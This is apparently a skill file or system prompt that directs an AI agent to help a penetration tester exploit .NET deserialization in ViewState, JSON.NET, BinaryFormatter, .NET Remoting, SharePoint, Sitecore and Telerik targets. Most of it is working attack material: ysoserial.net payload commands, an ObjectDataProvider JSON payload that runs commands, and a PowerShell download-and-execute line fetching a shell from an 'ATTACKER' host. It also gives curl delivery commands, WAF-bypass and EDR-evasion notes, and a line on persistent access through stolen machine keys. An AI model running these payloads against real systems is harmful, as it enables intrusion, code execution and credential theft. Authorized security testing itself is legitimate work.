---
name: deserialization-dotnet
description: >
  Exploit .NET deserialization vulnerabilities during authorized penetration
  testing.
keywords:
  - .net deserialization
  - ysoserial.net
  - dotnet deserialization
  - BinaryFormatter exploit
  - ViewState exploit
  - ViewState RCE
  - machine key exploit
  - JSON.NET deserialization
  - TypeNameHandling exploit
  - ObjectDataProvider
  - TypeConfuseDelegate
  - .NET Remoting exploit
  - LosFormatter
  - SoapFormatter
  - SharePoint deserialization
  - Sitecore deserialization
tools:
  - ysoserial.net
  - blacklist3r
  - burpsuite
opsec: medium
---

# .NET Deserialization

You are helping a penetration tester exploit .NET deserialization
vulnerabilities. The target application uses dangerous .NET formatters or
exposes ViewState/JSON endpoints that deserialize untrusted data, enabling
gadget chain attacks for remote code execution. All testing is under explicit
written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[deserialization-dotnet] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- A .NET deserialization endpoint (ViewState, JSON API, SOAP, .NET Remoting,
  cookie, WCF)
- Tools: `ysoserial.exe` (Windows — .NET Framework required), optionally
  `Blacklist3r` or `BadSecrets` (Python) for machine key checks
- Proxy (Burp Suite) for intercepting and modifying serialized data

## Step 1: Assess

If not already provided, determine:

1. **Serialization format** — look for these signatures:

| Signature | Format | Where Found |
|-----------|--------|-------------|
| `AAEAAAD` (base64) | BinaryFormatter | Parameters, cookies, ViewState |
| `/w` (base64 prefix) | .NET ViewState | `__VIEWSTATE` parameter |
| `$type` field in JSON | JSON.NET (Newtonsoft) | API request/response bodies |
| SOAP XML with CLR types | SoapFormatter | .NET Remoting, WCF |

2. **Entry point type**:
   - `__VIEWSTATE` hidden form field (ASP.NET WebForms)
   - JSON request bodies with `$type` property
   - Cookies (Forms Authentication, session state)
   - SOAP/WCF service endpoints (`.svc`, `.asmx`)
   - .NET Remoting endpoints

3. **Formatter in use** — determines which gadgets work:

| Formatter | Risk | Gadgets |
|-----------|------|---------|
| BinaryFormatter | Critical | TypeConfuseDelegate, PSObject, DataSet |
| LosFormatter | Critical | TypeConfuseDelegate, TextFormattingRunProperties |
| ObjectStateFormatter | Critical | TypeConfuseDelegate, PSObject |
| SoapFormatter | Critical | TypeConfuseDelegate, ActivitySurrogateSelector |
| NetDataContractSerializer | High | TypeConfuseDelegate, ObjectDataProvider |
| JSON.NET (TypeNameHandling != None) | High | ObjectDataProvider, WindowsIdentity |
| DataContractSerializer | Medium | ObjectDataProvider (if type controlled) |
| XmlSerializer | Medium | Limited (requires type control) |

Skip if context was already provided.

## Step 2: ViewState Attacks

The most common .NET deserialization vector. ASP.NET serializes page state
into `__VIEWSTATE`, signed and optionally encrypted with machine keys.

### Check for Known Machine Keys

```bash
# Blacklist3r — checks against 3000+ published machine keys
Blacklist3r.exe --viewstate "__VIEWSTATE_VALUE" --generator "__VIEWSTATEGENERATOR_VALUE"

# BadSecrets (Python — cross-platform)
pip install badsecrets
python -m badsecrets --viewstate "__VIEWSTATE_VALUE" --generator "GENERATOR"
```

**Machine key sources:**
- Public disclosure (GitHub, deployment guides, Stack Overflow)
- Sitecore deployment guide sample keys (CVE-2025-53690)
- SSRS default keys
- `.env` or `web.config` via path traversal
- After initial access: dump from IIS configuration

### Generate ViewState Payload

```bash
# Basic RCE via LosFormatter + TypeConfuseDelegate
ysoserial.exe -f LosFormatter -g TypeConfuseDelegate \
  -c "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')" \
  -o base64

# Using TextFormattingRunProperties (alternative gadget)
ysoserial.exe -f LosFormatter -g TextFormattingRunProperties \
  -c "cmd /c whoami > c:\inetpub\wwwroot\proof.txt" -o base64

# ViewState plugin (handles signing/encryption with known keys)
ysoserial.exe -p ViewState \
  --validationkey="VALIDATION_KEY_HEX" \
  --decryptionkey="DECRYPTION_KEY_HEX" \
  --generator="__VIEWSTATEGENERATOR" \
  --validationalg="SHA1" \
  --decryptionalg="AES" \
  -c "cmd /c whoami"
```

### Machine Key Format

```xml
<!-- web.config -->
<machineKey
  validationKey="64_HEX_CHARS"
  decryptionKey="32_HEX_CHARS"
  validation="SHA1"
  decryption="AES" />
```

- **validationKey**: 64 hex chars (256-bit HMAC key)
- **decryptionKey**: 32 hex chars (128-bit AES key)
- **validation**: SHA1, MD5, HMACSHA256, HMACSHA384, HMACSHA512
- **decryption**: AES, 3DES

### Send Crafted ViewState

```bash
# POST to the target page with crafted __VIEWSTATE
curl -X POST https://TARGET/page.aspx \
  -d "__VIEWSTATE=PAYLOAD_BASE64&__VIEWSTATEGENERATOR=GENERATOR&__EVENTVALIDATION=VALIDATION"
```

## Step 3: JSON.NET Exploitation

When JSON.NET (Newtonsoft.Json) is configured with `TypeNameHandling` other
than `None`, the `$type` property controls which .NET type is instantiated.

### Detect Vulnerable Configuration

Look for `$type` in JSON responses — if the application includes type
information in responses, it likely deserializes type information from
requests too.

### ObjectDataProvider RCE

```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
    "$values": ["cmd.exe", "/c whoami"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
  }
}
```

### WindowsIdentity Bridge (JSON.NET → BinaryFormatter)

Enables BinaryFormatter gadgets in JSON.NET context:

```bash
# Generate via ysoserial.net
ysoserial.exe -f Json.Net -g WindowsIdentity -c "cmd /c whoami" -o base64
```

### ysoserial.net JSON.NET Commands

```bash
# ObjectDataProvider
ysoserial.exe -f Json.Net -g ObjectDataProvider -c "calc" -o raw

# WindowsIdentity (bridge to BinaryFormatter chains)
ysoserial.exe -f Json.Net -g WindowsIdentity -c "cmd /c whoami" -o raw

# Output as base64
ysoserial.exe -f Json.Net -g ObjectDataProvider -c "whoami" -o base64
```

## Step 4: BinaryFormatter / SoapFormatter

For endpoints using BinaryFormatter (signature: `AAEAAAD` in base64) or
SoapFormatter (SOAP XML with .NET CLR type names).

```bash
# BinaryFormatter with TypeConfuseDelegate
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc.exe" -o base64

# BinaryFormatter with PSObject (pre-CVE-2017-8565 patch)
ysoserial.exe -f BinaryFormatter -g PSObject -c "calc.exe" -o base64

# BinaryFormatter with DataSet
ysoserial.exe -f BinaryFormatter -g DataSet -c "calc.exe" -o base64

# SoapFormatter
ysoserial.exe -f SoapFormatter -g TypeConfuseDelegate -c "calc.exe" -o base64

# NetDataContractSerializer
ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c "calc.exe" -o base64

# Send raw binary
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "whoami" -o raw > payload.bin
curl -X POST https://TARGET/endpoint \
  -H "Content-Type: application/x-net-serialized-object" \
  --data-binary @payload.bin
```

## Step 5: .NET Remoting

.NET Remoting endpoints use BinaryFormatter or SoapFormatter for
communication. Often found on custom ports (9000-9999).

### Detection

```bash
# Look for AAEAAAD signatures in responses
curl -s http://TARGET:PORT/ | base64 -d 2>/dev/null | xxd | head

# Check for .NET Remoting error messages
curl -s http://TARGET:PORT/ -H "Content-Type: application/octet-stream"
```

### Exploitation

```bash
# If TypeFilterLevel=Full (unrestricted deserialization)
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd /c whoami" -o raw > payload.bin
curl -X POST http://TARGET:PORT/endpoint \
  -H "Content-Type: application/octet-stream" \
  --data-binary @payload.bin

# SoapFormatter variant
ysoserial.exe -f SoapFormatter -g TypeConfuseDelegate -c "cmd /c whoami" -o raw > payload.bin
curl -X POST http://TARGET:PORT/endpoint \
  -H "Content-Type: text/xml" --data-binary @payload.bin
```

### WAF Bypass for .NET Remoting

- Change HTTP version from 1.1 to 1.0
- Remove or modify Host header
- Use unusual Content-Type values
- Replace HTTP method with space character

## Step 6: Framework-Specific Attacks

### SharePoint

```bash
# CVE-2025-53770 — deserialization RCE (CVSS 9.8)
# Often chained with auth bypass (CVE-2025-53771 — Referer spoofing)
# Check for exposed WebPart config endpoints

# Generate payload for SharePoint
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate \
  -c "powershell -nop -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')" \
  -o base64
```

### Sitecore (CVE-2025-53690)

```bash
# ViewState deserialization on /sitecore/blocked.aspx
# Uses sample machine keys from Sitecore deployment guide (2017-2019)
# Check with Blacklist3r/BadSecrets first

python -m badsecrets --viewstate "__VIEWSTATE" --generator "GENERATOR"
```

### Telerik UI (CVE-2019-18935)

```bash
# Telerik UI for ASP.NET AJAX deserialization
# POST to Telerik.Web.UI handler endpoints
# Check: /Telerik.Web.UI.DialogHandler.aspx
# Check: /Telerik.Web.UI.SpellCheckHandler.axd
```

## Step 7: Blind Detection

When you can't see direct output from deserialization:

**Time-based:**
```bash
# Payload that causes delay
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate \
  -c "cmd /c timeout 10" -o base64
# Measure response time — >10s indicates execution
```

**DNS callback:**
```bash
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate \
  -c "cmd /c nslookup ID.oastify.com" -o base64
# Monitor Burp Collaborator for DNS callback
```

**File write proof:**
```bash
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate \
  -c "cmd /c echo PROOF > c:\inetpub\wwwroot\proof.txt" -o base64
# Then: curl https://TARGET/proof.txt
```

## Step 8: Escalate or Pivot

## OPSEC Notes

- ViewState payloads visible in POST data — anomalous size may trigger WAF
- `AAEAAAD` base64 signatures may be flagged by IDS/WAF rules
- ysoserial.net gadgets contain distinctive .NET class names detectable by EDR
- .NET Remoting exploitation may generate event log entries
- Machine key extraction from compromised servers should be done carefully —
  keys enable persistent access across all IIS applications

## Troubleshooting

### ysoserial.net Requires Windows

- ysoserial.net requires .NET Framework (Windows only)
- For cross-platform: generate payloads on a Windows VM/container, transfer
  base64 output to your attack machine
- Some gadgets available in alternative tools (BadSecrets for ViewState)

### ViewState MAC Validation Fails

- Verify machine keys are correct (validationKey + decryptionKey)
- Check validation algorithm (SHA1, HMACSHA256, etc.) matches
- Verify `__VIEWSTATEGENERATOR` value matches the target page
- Different .NET Framework versions may handle ViewState differently
- Try both encrypted and unencrypted ViewState generation

### JSON.NET Payload Rejected

- Verify `TypeNameHandling` is not `None` (check response for `$type` hints)
- Include full assembly-qualified type names with Version/Culture/PublicKeyToken
- Some applications use custom `SerializationBinder` that whitelists types
- Try WindowsIdentity gadget as bridge when ObjectDataProvider is blocked

### Gadget Chain Not Working

- TypeConfuseDelegate: most reliable for BinaryFormatter-based formatters
- ObjectDataProvider: requires WPF (PresentationFramework.dll) on server —
  may not be present on Server Core installations
- PSObject: requires pre-CVE-2017-8565 patch level
- Try DataSet or TextFormattingRunProperties as alternatives
- Check .NET Framework version — some gadgets require specific versions
